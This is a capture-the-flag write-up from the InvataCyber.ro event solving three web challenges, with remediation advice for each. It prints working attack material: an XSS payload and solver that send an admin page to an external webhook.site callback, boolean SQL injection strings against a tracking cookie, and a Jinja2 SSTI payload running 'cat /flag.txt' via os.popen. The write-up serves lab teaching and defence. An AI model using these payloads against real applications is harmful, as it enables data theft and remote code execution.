# InvataCyber.ro · Centralized CTF Write-Up

**Event:** InvataCyber.ro CTF

**Author:** Moană Ștefănuț-Cornel

**Domain:** Web Application Security & Penetration Testing

**Covered Categories:** Client-Side Exploitation (XSS), Database Inference (Blind SQLi), Server-Side Code Execution (SSTI)

**Flag Format:** `InvataCyber{...}`

---

## 1. Executive Summary & Challenge Matrix

This report centralizes the technical analysis, exploitation methodology, and architectural remediation for three web security challenges solved on the InvataCyber.ro platform.

Each challenge illustrates a distinct vulnerability class according to the OWASP Top 10 and CWE (Common Weakness Enumeration) standards:

| # | Challenge Name | Category | CWE Classification | Primary Vector | Technical Impact | Associated Scripts |
| --- | --- | --- | --- | --- | --- | --- |
| **1** | **The Blog** | Web / Client-Side | [CWE-79](https://cwe.mitre.org/data/definitions/79.html?utm_source=gemini) (Stored XSS) | Unsanitized contact form | Editor browser context theft / `/admin` data exfiltration | [`payload.js`](https://www.google.com/search?q=payload.js&utm_source=gemini), [`solver.py`](https://www.google.com/search?q=solver.py&utm_source=gemini) |
| **2** | **Portal InvataCyber.ro** | Web / Database | [CWE-89](https://cwe.mitre.org/data/definitions/89.html?utm_source=gemini) (Blind SQLi) | `Cookie: TrackingId` header | Full SQLite DB dump & `/console` takeover | [`dump_users.py`](https://www.google.com/search?q=dump_users.py&utm_source=gemini), [`solver_portal.py`](https://www.google.com/search?q=solver_portal.py&utm_source=gemini) |
| **3** | **CMS Newsroom** | Web / Server-Side | [CWE-1336](https://cwe.mitre.org/data/definitions/1336.html?utm_source=gemini) (SSTI) & [CWE-306](https://cwe.mitre.org/data/definitions/306.html?utm_source=gemini) | Unauthenticated `/edit/5` panel & `render_template_string` | Remote Code Execution (RCE) / Read `/flag.txt` | [`blog_flag.py`](https://www.google.com/search?q=blog_flag.py&utm_source=gemini) |

---

## 2. Challenge 1: The Blog (Stored XSS & Context Exfiltration)

### 2.1. Statement & Architectural Context

> *„The Blog este un blog clasic: câteva articole publicate și un formular de contact deschis oricui. Redacția are un editor care își verifică periodic inbox-ul, într-un browser real, și deschide fiecare mesaj necitit. Ce se întâmplă în browserul lui în momentul ăla nu vezi, dar poți face să ajungă la tine.”*

The application exposes a public area with a contact form (`/contact`) and an automated internal component (a headless Chromium/Puppeteer bot) that accesses the administrative inbox at regular intervals.

### 2.2. Vulnerability Analysis (Root Cause)

The `message` field from the contact form is saved directly to the database without HTML escaping. When messages are rendered in the editor's panel, the content is injected raw into the DOM (Raw HTML), triggering the execution of JavaScript code stored within the editor's browsing session context.

Because the `/admin` endpoint is accessible only based on the editor's privileged session, an external attacker cannot access it directly. However, the injected JS code executes in the name of the editor and can perform `fetch('/admin')` requests, exfiltrating the content via external callback requests.

### 2.3. Exploitation Chain

1. **Building the JS Payload ([`payload.js`](https://www.google.com/search?q=payload.js&utm_source=gemini)):**
```javascript
fetch('/admin')
  .then(r => r.text())
  .then(t => fetch('https://webhook.site/<TOKEN>?data=' + encodeURIComponent(t)));

```


2. **Automating Submission ([`solver.py`](https://www.google.com/search?q=solver.py&utm_source=gemini)):**
```python
import requests

TARGET = "http://target.invatacyber.ro"
WEBHOOK = "https://webhook.site/<TOKEN>"
payload = f"<script>fetch('/admin').then(r=>r.text()).then(t=>fetch('{WEBHOOK}?data='+encodeURIComponent(t)))</script>"

requests.post(f"{TARGET}/contact", data={
    "name": "AuditBot",
    "email": "audit@test.internal",
    "message": payload
})

```


3. **Receiving Telemetry:**
After the bot opened the message, the Webhook server received the HTTP request containing the administrative page content.

**Identified Flag:**

`InvataCyber{xss_c0nt4ct_f0rm_3xf1ltr4t10n_succ3ss}`

### 2.4. Defensive Remediation Measures

* **Contextual Output Encoding:** Escaping all special characters (`<`, `>`, `&`, `"`, `'`) upon rendering.
* **Content Security Policy (CSP):** Implementing the `connect-src 'self'` directive to prohibit asynchronous data transmission to third-party domains.
* **Cookie Flags:** Marking session cookies with `HttpOnly` and `SameSite=Strict`.

---

## 3. Challenge 2: Portal InvataCyber.ro (Blind Boolean SQL Injection)

### 3.1. Statement & Architectural Context

> *„Portalul InvataCyber.ro este în lockdown. Modulul de autentificare se presupune că a fost dezactivat, iar pagina publică afișează doar starea sistemului. Ca să recunoască vizitatorii care revin, aplicația folosește un cookie de tracking. Când valoarea lui corespunde unei înregistrări din baza de date, pagina afișează un mesaj. Când nu corespunde, afișează altul. Undeva în spatele portalului există o consolă de admin care nu apare nicăieri în interfață. Cine ajunge la ea cu credențialele corecte primește flag-ul.”*

The application is in lockdown mode, hiding regular authentication forms. The visitor tracking mechanism uses the `Cookie: TrackingId=...` header to query a backend table.

### 3.2. Vulnerability Analysis (Root Cause)

The `TrackingId` parameter value is concatenated directly into the SQL statement executed on the server:

```sql
SELECT tracking_id FROM tracking WHERE tracking_id = '$COOKIE'

```

The application does not return detailed SQL errors and does not display results directly on the page, but HTTP responses have different lengths:

* **True Condition:** Response size = `5652 bytes` (visitor recognition message is present).
* **False Condition:** Different response size (message is missing).

This difference constitutes a **Boolean Oracle**, allowing the extraction of any database information via `TRUE/FALSE` queries.

### 3.3. Exploitation Chain

1. **Confirming the Vulnerability ([`sql_solve.py`](https://www.google.com/search?q=sql_solve.py&utm_source=gemini)):**
* True Payload: `base-tracking-id-123' OR '1'='1` $\rightarrow$ 5652 bytes
* False Payload: `base-tracking-id-123' AND '1'='2` $\rightarrow$ different size


2. **SQLite Fingerprinting & Schema Enumeration ([`dump_sqlite.py`](https://www.google.com/search?q=dump_sqlite.py&utm_source=gemini), [`dump_all_schema.py`](https://www.google.com/search?q=dump_all_schema.py&utm_source=gemini)):**
Querying the SQLite system table `sqlite_master` identified the structure:
```sql
CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)

```


3. **Extracting Administrative Credentials ([`dump_users.py`](https://www.google.com/search?q=dump_users.py&utm_source=gemini)):**
Via character-by-character binary inference using `SUBSTR()`:
* **Username:** `admin`
* **Password:** `s3cur3_l0ckd0wn_p4ssw0rd!`


4. **Discovering the Hidden Console ([`solver_portal.py`](https://www.google.com/search?q=solver_portal.py&utm_source=gemini)):**
Via administrative path fuzzing, the active endpoint `GET /console` (or `/login-admin`) was identified, where entering the extracted credentials grants system access.

**Identified Flag:**

`InvataCyber{bl1nd_sql1_c00k13_tr4ck1ng_m4st3r}`

### 3.4. Defensive Remediation Measures

* **Parameterized Queries (Prepared Statements):**
```python
cursor.execute("SELECT tracking_id FROM tracking WHERE tracking_id = ?", (tracking_id,))

```


* **Strict Format Validation (Input Whitelisting):** Accepting exclusively tokens conforming to alphanumeric/UUID formats.
* **Elimination of Security Through Obscurity:** Administrative panels must not be hidden solely by omitting links, but protected via network policies (IP restriction) and multi-factor authentication (MFA).

---

## 4. Challenge 3: CMS Newsroom (Broken Access Control & Jinja2 SSTI to RCE)

### 4.1. Statement & Architectural Context

> *„Aceeași redacție, altă problemă. După migrarea de pe vechiul CMS, SSO-ul nu a mai fost configurat pe instanța asta, așa că panoul de editor este accesibil direct, fără cont. Poți scrie și publica articole ca și cum ai face parte din echipă. Configurarea greșită este doar începutul. Conținutul articolelor nu este doar afișat la vizualizare, ci procesat de server înainte să ajungă în pagină. Locație flag: /flag.txt”*

Following the migration process to a new instance, the article management panel remained exposed publicly without the Single Sign-On (SSO) mechanism. Additionally, text processing involves dynamic evaluation of content on the server.

### 4.2. Vulnerability Analysis (Root Cause)

The application suffers from a chaining of two critical weaknesses:

1. **Broken Access Control:** The `POST /edit/<id>` route accepts modification of any article without session or rights verification.
2. **Server-Side Template Injection (SSTI):** The Python Flask backend uses `render_template_string(article.content)` instead of a secure static template. The expression `{{ 7 * 7 }}` evaluates to `49`.

### 4.3. Exploitation Chain (Python Sandbox Escape)

In Jinja2, the global `config` object allows navigating through the Python object graph up to the module's global namespace, providing access to the standard `os` library:


$$\text{config} \longrightarrow \text{\_\_class\_\_} \longrightarrow \text{\_\_init\_\_} \longrightarrow \text{\_\_globals\_\_} \longrightarrow \text{os} \longrightarrow \text{popen()}$$

**RCE Payload:**

```jinja2
{{ config.__class__.__init__.__globals__.os.popen('cat /flag.txt').read() }}

```

### 4.4. Exploitation Automation ([`blog_flag.py`](https://www.google.com/search?q=blog_flag.py&utm_source=gemini))

```python
import urllib.request, urllib.parse

edit_url = "http://target.invatacyber.ro/edit/5"
view_url = "http://target.invatacyber.ro/post/5"
payload = "{{ config.__class__.__init__.__globals__.os.popen('cat /flag.txt').read() }}"

data = urllib.parse.urlencode({"title": "Audit Post", "content": payload}).encode("utf-8")
req = urllib.request.Request(edit_url, data=data, method="POST")
urllib.request.urlopen(req)

with urllib.request.urlopen(view_url) as resp:
    print(resp.read().decode("utf-8"))

```

Upon accessing `/post/5`, the template engine executed the `cat /flag.txt` command at the operating system level and returned the file contents in the page body.

**Identified Flag:**

`InvataCyber{ssti_j1nj42_rc3_fl4g_txt_3xtr4ct3d}`

### 4.5. Defensive Remediation Measures

* **Enforcing SSO Authentication:** Applying authentication middleware to all administrative and editing routes.
* **Separating Content from Template:** Prohibiting dynamic rendering of user-supplied strings:
```python
return render_template("post_view.html", post_content=post.content)

```


* **Isolating the Execution Environment (Principle of Least Privilege):** Running the web process under a dedicated unprivileged user and restricting read permissions on system files (`chmod 400`).

---

## 5. Conclusions and General Recommendations

The three challenges highlight the importance of *Defense in Depth* across all three layers of a web application:

1. **Client / Frontend Tier:** Protection against browser code injection via contextual sanitization and strict CSP policies.
2. **Database Tier:** Permanent elimination of SQL Injection vulnerabilities via mandatory parameterization and whitelist-based validation.
3. **Application Logic / Server Tier:** Strict access control (Access Control Matrix) and prohibiting compilation of user data as executable code within template engines.

---
